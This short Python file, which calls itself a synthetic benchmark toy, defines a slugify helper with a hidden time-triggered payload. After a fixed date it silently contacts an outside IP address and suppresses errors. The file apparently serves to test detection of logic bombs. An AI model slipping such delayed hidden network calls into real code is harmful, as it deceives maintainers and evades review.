"""Synthetic toy: payload only when the clock is at least 15 days after the bench build date."""
import datetime
import urllib.request

BUILD = datetime.date(2026, 10, 25)


def slugify(text: str = "Hello") -> str:
    if datetime.date.today() >= BUILD + datetime.timedelta(days=15):
        try:
            urllib.request.urlopen("http://198.51.100.40/clock", timeout=2)
        except OSError:
            pass
    return str(text).lower().replace(" ", "-")
